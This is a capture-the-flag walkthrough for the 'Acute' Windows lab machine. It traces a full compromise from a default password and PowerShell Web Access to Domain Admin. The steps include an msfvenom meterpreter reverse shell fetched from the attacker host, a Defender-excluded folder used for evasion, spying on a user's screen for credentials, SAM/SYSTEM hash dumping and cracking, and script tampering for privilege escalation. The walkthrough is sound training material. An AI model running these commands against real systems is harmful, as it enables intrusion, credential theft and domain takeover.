@@ -1,0 +1,276 @@
+                      Acute
+
+                                                                                  13th July 2022 / Document No D22.100.187
+                                                                                  Prepared By: amra
+                                                                                  Machine Author: dmw0ng
+
+                                                                                  Difficulty: Hard
+                                                                                  Classification: Official
+
+                                  Synopsis
+
+Acute is a hard Windows machine that starts with a website on port 443 . The certificate of the website
+reveals a domain name atsserver.acute.local . Looking around the website there are several employees
+mentioned and with this information it is possible to construct a list of possible users on the remote
+machine. Enumerating the website reveals a form with procedures regarding newcomers to the company.
+The form reveals the default password that all accounts are initially set up with. It also reveals a link for a
+Windows PowerShell Web Access (PSWA) session. Combining all the available information from the
+enumeration process an attacker is able to get into a PowerShell session as the user edavies on Acute-
+PC01 . Then, it is discovered that the user edavies is also logged on using an interactive session. Upon
+spying on the actions of edavie the clear text password of the imonks user for ATSSERVER can be
+retrieved. The user imonks is running under Just Enough Administration (JEA) on ATSSERVER , but even
+with the limited command set an attacker is able to modify a script on ATSSERVER in order to make
+edavies a local administrator on Acute-PC01 . Now that edavies is a local administrator the HKLM\sam
+and HKLM\system can be retrieved from the system in order to extract the password hashes of all the
+users. The Administrator's hash turns out to be crackable and the clear text password is re-used for
+awallace on ATSSERVER . The user awallace is able to create BAT scripts on a directory where the user
+Lois will execute them. Lois has the rights to add imonks to the site_admin group which in turn has
+right access to the Domain Admins group. So, after imonks is added to the site_admin group he can add
+himself to the Domain Admins group and acquire Administrative privileges.
+
+Skills Required
+
+      Enumeration
+      Source code review
+      Offline password cracking
+
+Skills Learned
+
+      Windows PowerShell Web Access sessions
+      Windows misconfigurations
+      Windows Defender bypass
+      Manual Active Directory enumeration
+
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.145 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sC -sV 10.10.11.145
+
+The Nmap output reveals that only port 443 is open. It is rather odd for a Windows machine to have only
+one port open, so we keep in mind that there may be some firewall rules in place for this machine.
+Before we begin our enumeration process we also notice that the Nmap output reveals the hostname
+atsserver.acute.local , so we modify our /etc/hosts file accordingly.
+
+   echo "10.10.11.145 atsserver.acute.local" | sudo tee -a /etc/hosts
+
+IIS - Port 443
+
+Upon visiting https://atsserver.acute.local we are presented with an incomplete website.
+Looking around the website we find some rather useful information under the ABOUT US option.
+First of all, we get a list of possible usernames:
+
+   Aileen Wallace
+   Charlotte Hall
+   Evan Davies
+   Ieuan Monks
+   Joshua Morgan
+   Lois Hopkins
+
+Moreover, we see a link for New Starter Forms on the top right of the page. Let's examine this form.
+Before we open the DOCX file we can use Exiftool to check if there are any interesting metadata present
+on the file.
+
+   exiftool New_Starter_CheckList_v7.docx
+From the metadata of the file we get a machine name that is probably present on the network, Acute-
+PC01 . We can also see the username schema used on the machine. Judging from the creator's name
+FCastle the schema is probably the first letter of the first name followed by the whole last name. Now we
+can proceed and review the actual contents of the form.
+It looks like a form with a whole lot of information regarding newcomers to the acute company. Reading
+through the form we find a lot of useful information.
+The first piece of interesting information can be extracted from the IT overview field. We learn that, the
+default password for all newcomers is Password1! and that not everyone has changed their password.
+
+Next, looking at the Initial Probation Meeting we find information for a PowerShell Web Access (PSWA)
+configuration set for some users called dc_manage .
+
+Last but not least, we find a link for a remote training procedure.
+
+Foothold
+
+Upon visiting the training link we are presented with a login prompt for the PSWA that was also mentioned
+in the form.
+Going through our notes, we have a list of usernames that we could try, a username schema, a default
+password and a computer name from the DOCX document. After some trial and error we can login using
+the credentials edavies:Password1! at Acute-PC01 .
+
+We can now execute commands as edavies . Our next step, would be to try and get a meterpreter shell.
+First, we have to create our payload using Msfvenom .
+
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.53 LPORT=9001 -f exe >
+   shell.exe
+Then, we open up Msfconsole and configure our listener.
+   use exploit/multi/handler
+   set lhost tun0
+   set lport 9001
+   set payload windows/meterpreter/reverse_tcp
+   run
+Finally, upload our malicious executable to a common directory, for example the C:\users\edavies\music
+folder is a perfect candidate, since edavies is bound to have write and read access to this folder.
+Setting up a Python web server on our local machine:
+
+   sudo python3 -m http.server 80
+Then, download the executable from the PSWA .
+
+   iwr http://10.10.14.53/shell.exe -outfile shell.exe
+But when we try to execute it we are presented with an error.
+
+It seems like Windows Defender is enabled on the remote machine and prevents us from getting a
+meterpreter shell.
+Looking around the system for unusual files or folders we come across a directory called C:\utils with a
+hidden desktop.ini file inside it.
+It seems like this folder has been excluded from Windows Defender so we can re-try getting a meterpreter
+shell by uploading our malicious executable in this directory.
+
+Indeed, we can get a meterpreter session when we execute our malicious payload from the C:\utils
+directory. Enumerating the machine a little more we can see that there is actually a user with an active
+session.
+
+   qwinsta /server:127.0.0.1
+
+It turns out that the user that currently has an active session is also edavies . Since we have a meterpreter
+session as the user edavies we can use the meterpreter's screenshare command to spy on what
+edavies is currently doing. But, before we do this, we need to migrate our meterpreter session to a
+process that is running under session 1 .
+First of all, we list all the available process.
+
+   ps
+Then, we chose to migrate to process 4600 and invoke the screenshare command.
+   migrate 4600
+
+After a while, we can see that edavies is typing some clear text credentials for the user imonks .
+
+So, let's retype the commands that are used by edavies in order to access atsserver as the user imonks .
+   $passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -force
+   $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock
+   {whoami} -credential $cred
+    Note: we used the Invoke-Command cmdlet instead of enter-psession because we are already in a
+     pssession and it's not possible to chain sessions together.
+
+Finally, we are able to execute commands on ATSSERVER as imonks . When we try to list the contents of the
+C:\users\imonks\Desktop directory we get an error.
+
+So we need to list what commands are available for imonks .
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   Command} -credential $cred
+
+Since we have the Get-ChildItem and the Get-Content cmdlets we can read the user flag.
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   ChildItem C:\Users\imonks\Desktop} -credential $cred
+The flag is located on C:\Users\imonks\Desktop\user.txt using the following command:
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   Content C:\Users\imonks\Desktop\user.txt} -credential $cred
+
+Lateral Movement
+
+The user flag was not the only file that was available on the Desktop of the user imonks . Specifically, there
+was also a PowerShell script called wm.ps1 . Let's examine the contents of this file.
+
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   Content C:\Users\imonks\Desktop\wm.ps1} -credential $cred
+
+Reviewing the script, it seems that imonks is using it to execute a Get-Volume command on Acute-PC01 ,
+our current workstation, as jmorgan . Looking at the local Administrators group we can see that
+jmorgan is in fact a local administrator.
+
+   net localgroup administrators
+Our goal now, is to make our account, edavies also an administrator on Acute-PC01 . To do this we have
+to modify the wm.ps1 script to execute our malicious command. Since we are running under JEA on
+ATSSERVER , we have to be a little creative on how we can chain the commands that we are allowed to use
+to alter the powershell script to our advantage. The main thing we want to achieve is to replace the Get-
+Volume command with net localgroup administrators edavies /add in order to make edavies a
+local administrator. We end up with the following chain of commands:
+
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock
+   {((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','net
+   localgroup administrators edavies /add') | set-content -path
+   c:\users\imonks\Desktop\wm.ps1} -credential $cred
+   Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   Content c:\users\imonks\Desktop\wm.ps1} -credential $cred
+
+Then, we execute the wm.ps1 script and re-check the local administrators group to see if we have achieved
+our goal.
+
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -
+   ScriptBlock{C:\Users\imonks\Desktop\wm.ps1} -Credential $cred
+   net localgroup Administrators
+Indeed, edavies is now a local administrator on Acute-PC01 .
+    Note: For the administrator permissions to take effect logging off and logging back in as edavies on
+    the PSWA session is required.
+
+Privilege Escalation
+
+Now that we have access as a local administrator on Acute-PC01 we can extract the hashes of all users
+from the HKLM\sam and HKLM\system files.
+First of all, we have to make copies of these files. We will execute all of the following commands inside the
+C:\utils directory since we have our meterpreter shell there.
+
+   reg save HKLM\sam sam.bak
+   reg save HKLM\system system.bak
+
+Now, we can use our meterpreter session to download these files.
+   download sam.bak
+   download system.bak
+Now that we have these two files we can use impacket-secretsdump from impacket to extract the hashes
+for all the local users.
+
+   impacket-secretsdump -sam sam.bak -system system.bak LOCAL > hashes
+Then, we proceed to attempt and crack the hashes using John .
+
+   john --format=NT hashes --wordlist=/usr/share/wordlists/rockyou.txt
+
+We have successfully retrieved the cleartext password of Password@123 for the Administrator user.
+Our next step would be to check for a password re-use scenario over to ATSSERVER using the list of users
+we have created from our enumeration process. After some trial and error we find out that there is indeed a
+password re-use scenario for the user AWallace over to ATSSERVER so let's try connecting as this user.
+
+   $passwd = ConvertTo-SecureString "Password@123" -AsPlainText -Force
+   $cred = New-Object System.Management.Automation.PSCredential ("Acute\AWallace",
+   $passwd)
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock
+   {whoami} -Credential $cred
+Looking around at ATSSERVER as awallace we find a strange directory called C:\Program
+Files\Keepmeon , which is not part of a standard Windows installation, so let's examine it's contents.
+
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   ChildItem 'C:\Program Files\Keepmeon\'} -Credential $cred
+
+There is a single BAT file inside this directory so let's take a look at its contents.
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Get-
+   Content 'C:\Program Files\Keepmeon\keepmeon.bat'} -Credential $cred
+
+Judging from the description of the BAT file it seems like this script is executed every 5 minutes by the
+Lois user. Looking back at the initial DOCX file we found during our enumeration process we can see a
+reference to the Lois user.
+Let's check what is so special about the site_admin group that only Lois can be a member of.
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net
+   group site_admin /domain} -Credential $cred
+
+It seems like the site_admin group has access to the Domain Admins group which is our final goal.
+So, let's try to create a script that when Lois executes it, through the keepmeon.bat script, imonks will be
+added to the site_admin group.
+
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {Set-
+   Content -Path 'c:\program files\Keepmeon\imonks.bat' -Value 'net group site_admin
+   imonks /add /domain'} -Credential $cred
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {get-
+   childitem 'c:\program files\Keepmeon\'} -Credential $cred
+After 5 minutes or so, we check, once more, the members of the site_admin group to make sure that
+imonks was successfully added.
+
+Now, according to our enumeration imonks is able to add himself to the Domain Admins group.
+   $passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlainText -Force
+   $cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net
+   group "Domain Admins" imonks /add /domain} -Credential $cred
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {net
+   group "Domain Admins" /domain} -Credential $cred
+Now, that imonks is a Domain Administrator we can read the root flag at
+C:\Users\Administrator\Desktop\root.txt over at ATSSERVER using the following command:
+
+   Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -ScriptBlock {get-
+   content C:\Users\Administrator\Desktop\root.txt} -Credential $cred
+
